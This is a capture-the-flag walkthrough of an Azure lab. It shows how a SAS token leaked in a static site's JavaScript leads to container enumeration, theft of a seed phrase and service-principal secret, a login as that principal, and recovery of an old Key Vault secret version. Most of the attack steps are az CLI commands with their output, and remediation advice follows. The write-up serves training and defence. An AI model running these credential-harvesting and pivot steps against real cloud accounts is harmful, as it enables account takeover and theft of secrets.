# ☁️ CryptoCabana: The Ultimate Hacker's Walkthrough

**Room:** CryptoCabana (Hacker Holidays 2026 - Day 9)
**Difficulty:** Medium | **Category:** Cloud (Azure) | **Points:** 90
**Tags:** `Cloud`, `Azure`, `Storage`, `Key Vault`

> *"By the time he made it back from the breakfast buffet, his wallet had already moved on without him. The transaction was signed, properly signed, just not by him. He'd backed his seed phrase up weeks ago, into the CryptoCabana kiosk's vault — the one whose landing page promised, in exactly four words, 'Backed up. Sleep easy.'"* — Concierge Briefing

> *@0xMia: "if a value looks freshly rotated, ask yourself what it looked like five minutes before that 👀"*

---

## 📖 The Setup

| Item | Detail |
| :--- | :--- |
| **Room** | CryptoCabana |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Target** | `https://cryptocabanaf5scjagc.z13.web.core.windows.net/` |
| **Category** | ☁️ Cloud — Azure Storage & Key Vault |
| **Goal** | Recover the seed phrase and the Azure Key Vault secrets |
| **Flag Format** | `***{***_**_****_***_**_******}` |

---

## 🧠 The Hacker Mindset: Our Methodology

1. **The kiosk hands out trust for free.** Before we click *anything*, the page ships a SAS token to its own storage. That token is the first "trust" — and it reaches further than the page admits.
2. **Follow the trust past where the page points.** The page only ever talks to one container. The token can see the whole account — including a container the page never once mentions.
3. **Secrets don't stop at the first ask.** Key Vault keeps *every* version of a secret. When a value "looks freshly rotated," the real value is one version behind.

---

## 🎯 Challenge Briefing

The CryptoCabana kiosk promises to back up Ponzi's seed phrase ("Backed up. Sleep easy."). It's an Azure static website that silently hands the browser a **read/list SAS token** to the underlying storage account. That token lets anyone enumerate the account — and inside is a service-account credential that unlocks an Azure **Key Vault**. The vault holds the seed phrase in shards, but the middle shard was **rotated** — the flag lives in the *previous version* of the secret.

---

## 🧠 Attack Matrix & Decisions

```text
[ Static Site ] ──► [ app.js → SAS Token ] ──► [ Storage Account ] ──► [ Service Principal ] ──► [ Key Vault ] ──► [ Flag ]
  • inspect app.js       • sp=rl (read+list)   • list containers       • login w/ SP creds    • list secrets        • old shard version
  • no interaction       • scoped to account   • $web / backups /      • grab client_secret   • 4 secrets found     • reassemble shards
                                              •   vault (hidden)
```

| Phase | Technique | Key Finding |
| :--- | :--- | :--- |
| **1. Discovery** | Static JS analysis | `app.js` embeds a full SAS token (`sp=rl`, valid to 2099) |
| **2. Enumeration** | SAS container list | Containers: `$web`, `backups`, and hidden **`vault`** |
| **3. Exfiltration** | Blob download | `seed_phrase.txt` + `backup-service-account.json` (SP credentials) |
| **4. Pivot** | SP login + KV enum | Key Vault `ccabana-kv-f5scjagc` with 4 secrets |
| **5. Loot** | Secret versioning | `key-shard-2` rotated — flag in the previous version |

---

## 🔬 Step-by-Step Walkthrough

### Step 1: Pull Apart What the Kiosk Hands Out for Free

Load the kiosk. It's a simple "backup your seed phrase" page served from Azure Storage (a `*.web.core.windows.net` static site). No interaction required — we just read the page source and its JavaScript.

```bash
┌──(hacker㉿kali)-[~]
└─$ curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/
<!doctype html>
...
  <script src="app.js"></script>
```

`app.js` is the whole ballgame:

```javascript
// app.js
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=REDACTED";

function backupPhrase() {
  ...
  fetch(url, { method: "PUT", headers: { "x-ms-blob-type": "BlockBlob" }, body: phrase })
    .then((res) => { status.textContent = res.ok ? "Backed up. Sleep easy." : ... });
}
```

**Key findings:**
- Storage account: `cryptocabanaf5scjagc`
- SAS: `sv=2022-11-02 & ss=b (blobs) & srt=sco (service/container/object) & sp=rl (read+list) & se=2099`
- The page only ever PUTs into the `backups` container.

> *"What the kiosk hands out for free before you've even clicked anything."* — a read/list SAS token to its own storage account.

---

### Step 2: Follow the Trust Somewhere the Kiosk Never Points

The SAS says `sp=rl` — **read** and **list**. The kiosk's own page never lists anything; it only writes. Let's use the `list` permission the page keeps quiet about.

```bash
┌──(hacker㉿kali)-[~]
└─$ az login -u usr-08078296@thmctf.onmicrosoft.com -p '<TAP>'   # Azure Portal credentials from Cloud Details
┌──(hacker㉿kali)-[~]
└─$ SAS='sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=REDACTED'

┌──(hacker㉿kali)-[~]
└─$ az storage container list --account-name cryptocabanaf5scjagc --sas-token "$SAS" -o table
Name      Lease Status    Last Modified
--------  --------------  -------------------------
$web                      2026-07-16T18:26:22+00:00
backups                   2026-07-16T18:26:22+00:00
vault                     2026-07-16T18:26:23+00:00
```

There it is — a **`vault`** container that the kiosk's page never once references. Let's look inside.

```bash
┌──(hacker㉿kali)-[~]
└─$ az storage blob list --account-name cryptocabanaf5scjagc --container-name vault --sas-token "$SAS" -o table
Name                         Blob Type    Length    Last Modified
---------------------------  -----------  --------  -------------------------
backup-service-account.json  BlockBlob    360       2026-07-19T15:20:06+00:00
seed_phrase.txt              BlockBlob    88        2026-07-16T18:26:38+00:00
```

Download both:

```bash
┌──(hacker㉿kali)-[~]
└─$ az storage blob download --account-name cryptocabanaf5scjagc --container-name vault \
     --name seed_phrase.txt --sas-token "$SAS" --file seed_phrase.txt
┌──(hacker㉿kali)-[~]
└─$ cat seed_phrase.txt
velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp
```

The seed phrase is out of the "safe." And the other file is the real prize:

```bash
┌──(hacker㉿kali)-[~]
└─$ cat backup-service-account.json
{"client_id":"dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
 "client_secret":"UBX8Q~REDACTED",
 "key_vault_name":"ccabana-kv-f5scjagc",
 "key_vault_uri":"https://ccabana-kv-f5scjagc.vault.azure.net/",
 "note":"CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
 "tenant_id":"8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"}
```

> *"Somewhere in there is a second, more valuable set of keys."* — a full **Azure service principal** credential pointing at a Key Vault.

---

### Step 3: Pivot to the Key Vault

Log in as the backup automation service principal:

```bash
┌──(hacker㉿kali)-[~]
└─$ az login --service-principal \
     -u "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5" \
     -p "UBX8Q~REDACTED" \
     --tenant "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
...
  "user": { "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5", "type": "servicePrincipal" }
```

Enumerate the vault:

```bash
┌──(hacker㉿kali)-[~]
└─$ az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table
Name         Enabled    Expires
-----------  ---------  -------------------------
key-shard-1  True
key-shard-2  True
key-shard-3  True
master-key   True       2020-01-01T00:00:00+00:00
```

Four secrets — the seed phrase was split into shards. Pull the current values:

```bash
┌──(hacker㉿kali)-[~]
└─$ az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1 --query value -o tsv
THM{n0t_ur

┌──(hacker㉿kali)-[~]
└─$ az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 --query value -o tsv
Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.

┌──(hacker㉿kali)-[~]
└─$ az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-3 --query value -o tsv
ur_c01ns!}
```

> *"a vault that won't give up the real values on the first ask."* — shard-1 and shard-3 give real fragments, but **key-shard-2 was rotated**: its current value is just an IT note telling us the old value is still recoverable.

---

### Step 4: Recover the Rotated Secret (Previous Version)

Key Vault secrets keep every version. @0xMia's hint: *"if a value looks freshly rotated, ask yourself what it looked like five minutes before that."*

```bash
┌──(hacker㉿kali)-[~]
└─$ az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 -o json
https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/c922c422ffb34671a902389c372314f1
https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0
```

Two versions. The older one is the original shard:

```bash
┌──(hacker㉿kali)-[~]
└─$ az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2 --version 3d6492d2c6f74123bc754a9ded22b2a0 --query value -o tsv
_k3ys_n0t_
```

---

### Step 5: Reassemble the Flag

| Secret | Value |
| :--- | :--- |
| `key-shard-1` (current) | `THM{n0t_ur` |
| `key-shard-2` (previous version) | `_k3ys_n0t_` |
| `key-shard-3` (current) | `ur_c01ns!}` |

```text
THM{n0t_ur  +  _k3ys_n0t_  +  ur_c01ns!}
```

**Flag:** `THM{REDACTED}`

*(Assembled form matches the room's answer format `***{***_**_****_***_**_******}`: `n0t`/`ur`/`k3ys`/`n0t`/`ur`/`c01ns!`.)*

---

## 🛡️ Remediation & Security Recommendations

1. **Never ship long-lived SAS tokens in client-side code.** The `sp=rl` SAS with a 75-year validity window (`2024 → 2099`) turned a "harmless" static site into a storage enumerator. Use short-lived tokens, a stored access policy (`si=`), and scope them to the single container the client actually needs.
2. **Lock down anonymous enumeration.** With `srt=sco`, the SAS lists containers — which is how `vault` was found. A container-scoped SAS (`srt=c`) with `sp=rw` (write-only for the upload) would have prevented the leak.
3. **Never store service principal secrets in blob storage.** The automation account's `client_secret` in plaintext gave full access to the Key Vault. Use managed identities instead.
4. **Rotate properly.** Rotating `key-shard-2` but leaving the old value readable in a prior version is exactly how "rotated" secrets stay recoverable. Purge or disable old secret versions.

---

## 🏷️ Vulnerability & Exploit Classification

### 📌 Common Weakness Enumeration (CWE)
- **[CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)** — SAS token and service account credentials exposed via public static files.
- **[CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)** — Plaintext `client_secret` stored in a public blob container.
- **[CWE-538: Insertion of Sensitive Information into Externally-Accessible File](https://cwe.mitre.org/data/definitions/538.html)** — `app.js` ships a full read/list SAS token.

### 🌐 OWASP Top 10 & API Security Top 10
- **OWASP Top 10 (2021) - A01:2021 (Broken Access Control)** — Over-scoped SAS token permits enumeration beyond the intended container.
- **OWASP API Security Top 10 (2023) - API1:2023 (Broken Object Level Authorization)** — Storage objects (SP credentials) reachable with a token meant for a single purpose.

### ⚔️ MITRE ATT&CK
- **Tactics:** `Reconnaissance` ➔ `Credential Access` ➔ `Persistence`
- **Techniques:**
  - **[T1552.001: Unsecured Credentials - Files](https://attack.mitre.org/techniques/T1552/001/)** — Service principal credentials extracted from `backup-service-account.json`.
  - **[T1526: Cloud Service Discovery](https://attack.mitre.org/techniques/T1526/)** — Enumerating storage containers and Key Vault secrets.
  - **[T1078.004: Valid Accounts - Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)** — Authenticating as the backup automation service principal.

---

*"Backed up. Sleep easy." — but only if you remember which version of the secret you're sleeping on.*
